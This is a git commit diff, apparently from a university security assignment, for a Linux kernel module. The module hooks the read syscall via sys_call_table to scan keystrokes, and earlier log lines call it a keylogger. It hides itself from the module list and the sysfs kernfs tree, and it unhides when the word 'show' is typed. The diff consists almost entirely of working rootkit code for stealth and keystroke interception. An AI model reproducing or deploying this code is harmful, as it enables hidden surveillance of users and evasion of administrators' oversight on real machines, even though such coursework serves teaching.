dc00bf3e01b9e23eb86c3aa10db5f46a26c47d21
Guru Mc <ga79rok@mytum.de>
2014-11-16 00:04:53 +0100

    gmc: Working version of hide module type 'show' to unihde

--- Assignment05_temp/hidemodule.c
+++ Assignment05_temp/hidemodule.c
@@ -3,30 +3,115 @@
 #include <linux/init.h>
 #include <linux/proc_fs.h>
 #include <linux/string.h>
-#include <linux/cred.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
 #include <asm/page.h>
+#include <linux/kernfs.h>
+#include <linux/rbtree.h>
+#include <linux/hash.h>
+#include <linux/cred.h>
 #include <linux/sysfs.h>
 
 #include "sysmap.h"
-
+#define member rb
 
 static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
 static int  hidden = 0;
-//static char buff[10];
 static int state = 0;
+static int hstate = 0;
 
 void **sys_call_table;
 
 asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
-void module_show(void);
+static void kernfs_remove_node(struct kernfs_node *kn)
+{
+	/* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
+	 * Line 272@Linux/fs/kernfs/dir.c  
+	 */	
+	rb_erase(&kn->rb, &kn->parent->dir.children);
+	RB_CLEAR_NODE(&kn->rb);
+}
 
-static void match_word(char c)
-{	
+void delete_from_kernfs_tree(void){
+    kernfs_remove_node(THIS_MODULE->mkobj.kobj.sd);
+}
+
+/* Function to hide the module */
+void module_hide(void)
+{
+	if (hidden) return;
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	delete_from_kernfs_tree();	
+	hidden = !hidden;
+}
+
+int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
+{
+	if(hash != kn->hash)
+		return hash - kn->hash;
+	if(ns != kn->ns)
+		return ns - kn->ns;
+	return strcmp(name,kn->name);
+
+}
+
+int kernfs_insert_node(struct kernfs_node *kn)
+{
+      struct rb_node **node = &kn->parent->dir.children.rb_node;
+      struct rb_node *parent = NULL; 
 	
+      //printk("yaay! inside insert \n");
+
+      while(*node)
+      {
+		struct kernfs_node *pos;
+		int result;
+		/* Get the kernfs_node from rb, rb_to_kn() */
+		pos = rb_entry(*node, struct kernfs_node, member); 
+		parent = *node;
+		/*compare the names to get the position to insert in rb tree*/
+		result = name_compare(kn->hash, kn->name, kn->ns, pos);
+		//result = kernfs_sd_comapre(kn,pos);
+
+		if(result < 0)
+			node = &pos->rb.rb_left;
+		else if(result > 0)
+			node = &pos->rb.rb_right;
+		else 
+		{
+			return -EEXIST;
+		}
+	}
+	
+	/* Add new node and reblance the tree*/
+	rb_link_node(&kn->rb,parent,node);
+	rb_insert_color(&kn->rb, &kn->parent->dir.children);
+	
+	/* Successfully added, account subdir number */
+	if (kernfs_type(kn) == KERNFS_DIR)
+                 kn->parent->dir.subdirs++;
+	return 0;
+}
+
+void add_to_kernfs_tree(void){
+    kernfs_insert_node(THIS_MODULE->mkobj.kobj.sd);
+}
+
+ 
+void module_show(void)
+{
+	printk("Unhiding module  %s\n",THIS_MODULE->name);
+	if (!hidden) return;
+	list_add(&THIS_MODULE->list, module_previous);
+	add_to_kernfs_tree();	
+	hidden = !hidden;
+}
+
+/* State machine to match word "ping" */
+static void match_ping(char c)
+{	
         switch(c)
         {
           case 'p':if(!state) state++;
@@ -38,7 +123,7 @@ static void match_word(char c)
           case 'n':if(state == 2) state++;
                    break;
 
-          case 'g':if(state == 3) {printk(KERN_INFO"PONG"); state = 0; module_show();}
+          case 'g':if(state == 3) {printk(KERN_INFO"PONG"); state = 0;}
                     break;
 
           default: state = 0;
@@ -48,15 +133,38 @@ static void match_word(char c)
 	return;
 }
 
+/* State machine to match word "show" */
+static void match_show(char c)
+{
+	switch(c)
+        {
+          case 's':if(!hstate) hstate++;
+                   break;
+
+          case 'h':if(hstate == 1) hstate++;
+                   break;
+
+          case 'o':if(hstate == 2) hstate++;
+                   break;
+
+          case 'w':if(hstate == 3) {hstate = 0; module_show();}
+                    break;
+
+          default: state = 0;
+                   break;
+        }
+	return;
+}
+
 void scan_input(long count, char *buf)
 {
         int i = 0;
         for(i = 0; i<count ; i++)
         {
-		match_word(buf[i]);
+		match_ping(buf[i]);
+		match_show(buf[i]);	
 	}
 }
-
 
 /*
  * Our manipulated read syscall. It will print every keystroke to the syslog
@@ -105,35 +213,10 @@ static void enable_page_protection (void)
         }
 }
 
-void module_hide(void)
-{
-	if (hidden) return;
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-//	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-//	kobject_del(&THIS_MODULE->mkobj.kobj);
-//	list_del(&THIS_MODULE->mkobj.kobj.entry);
-	
-	hidden = !hidden;
-}
- 
-void module_show(void)
-{
-	printk("I'm now unhiding module %s\n",THIS_MODULE->name);
-	int result;
-	if (!hidden) return;
-	list_add(&THIS_MODULE->list, module_previous);
-//	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
-//	list_add(&THIS_MODULE->mkobj.kobj.entry,module_kobj_previous);
-	
-	hidden = !hidden;
-}
-
 
 static int __init hidemodule_init(void)
 {
-	printk("Loaded the module but its hidden\n");
-	printk(KERN_INFO "Loading keylogger LKM...\n");
+	printk(KERN_INFO "Loading hide_module LKM...\n");
 
         /* get the location of the sys_call_table from our sysmap.h file */
         sys_call_table = (void*) sysmap_sys_call_table;
@@ -159,7 +242,7 @@ static int __init hidemodule_init(void)
 
 static void __exit hidemodule_exit(void)
 {
-	printk(KERN_INFO "Unloading keylogger... bye!\n");
+	printk(KERN_INFO "Unloading hidden module... bye!\n");
 
         /* disable the write-protection */
         disable_page_protection();
